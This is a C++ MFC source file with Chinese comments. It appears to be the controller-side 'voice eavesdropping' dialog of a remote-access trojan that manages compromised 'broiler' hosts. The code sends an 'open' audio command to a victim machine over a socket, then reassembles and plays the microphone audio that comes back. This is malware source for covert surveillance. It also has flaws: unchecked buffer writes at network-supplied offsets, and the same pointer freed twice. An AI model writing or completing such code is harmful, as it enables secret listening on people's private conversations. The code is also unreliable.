// AudioDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Client.h"
#include "AudioDlg.h"
#include "BroilerData.h"

// CAudioDlg 对话框

IMPLEMENT_DYNAMIC(CAudioDlg, CDialog)

CAudioDlg::CAudioDlg(CWnd* pParent /*=NULL*/, SOCKET sock)
	: CDialog(CAudioDlg::IDD, pParent)
{
	m_socket = sock;
	m_pData = NULL;
}

CAudioDlg::~CAudioDlg()
{
}

void CAudioDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CAudioDlg, CDialog)
END_MESSAGE_MAP()


// CAudioDlg 消息处理程序
BOOL CAudioDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: 在此添加专用代码和/或调用基类
	if ( WM_KEYDOWN == pMsg->message)
	{
		int nVirtKey = (int)pMsg->wParam;
		if (VK_RETURN == nVirtKey || VK_ESCAPE == nVirtKey)  //如果按下的是回车键或ESC键，则截断消息
		{
			return TRUE;
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}

BOOL CAudioDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
    SetIcon(AfxGetApp()->LoadIcon(IDI_ICON_AUDIO), FALSE);	
	// TODO:  在此添加额外的初始化
    DlgInit();
	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}

void CAudioDlg::DlgInit()
{
	CString strTitle = _T("");
	strTitle.Format(_T("\\\\%s - 语音监听"), m_strIP);
	SetWindowText(strTitle);

	// 通知远程控制端对话框已经打开
	char strMsg[] = "open";  //开启线程
	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	tagMsgInfo.nMsgCmd = CMD_AUDIO;
	memcpy((char*)tagMsgInfo.context, (char*)strMsg, sizeof(strMsg));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
    //创建发送本地语音的工作线程
	m_hWorkThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThreadProc, (LPVOID)this, 0, NULL);
}

DWORD WINAPI CAudioDlg::WorkThreadProc( LPVOID lpParameter )
{
	return 0;
}

DWORD CAudioDlg::RecvAudioData(IN AUDIODATA_C tagAudioData)
{
	switch (tagAudioData.Id)
	{
	case 0:   //头信息
		{
			m_pData = new BYTE[tagAudioData.dwSize];  //申请空间
			memset(m_pData, 0, tagAudioData.dwSize);
		}
		break;
	case 1:  //正常大小数据块
		{
			//复制数据
			for(int i= tagAudioData.Begin, j = 0 ; j < AUDIO_BUF_SIZE; i++, j++)
			{
				m_pData[i] = tagAudioData.Data[j];
			}
		}
		break;
	case 2:  //最后一次复制数据
		{
			for(int i= tagAudioData.Begin, j=0; i < tagAudioData.dwSize; i++,j++)
			{
				m_pData[i] = tagAudioData.Data[j];
			}
		}
		break;
	default:
		{
			MessageBox(_T("未知的语音数据ID"),_T("提示"),MB_OK);
			delete[] m_pData;
			LocalFree(m_pData);
			return 1;
		}
	}
	//判断传送完以后是否可以播放声音
	if (tagAudioData.bRead)
	{
		m_Audio.playBuffer(m_pData, tagAudioData.dwSize);
		delete [] m_pData;
	}
	return 0;
}

DWORD WINAPI CAudioDlg::RecvAudioProc( LPVOID lpParameter )
{
	return 0;
}

void CAudioDlg::OnCancel()
{
	// TODO: 在此添加专用代码和/或调用基类
	DestroyWindow();
	delete this;
}

void CAudioDlg::PostNcDestroy()
{
	// TODO: 在此添加专用代码和/或调用基类
	CDialog::PostNcDestroy();
	((CBroilerData*)this->m_pParentWnd)->m_pAudioDlg = NULL; 
}
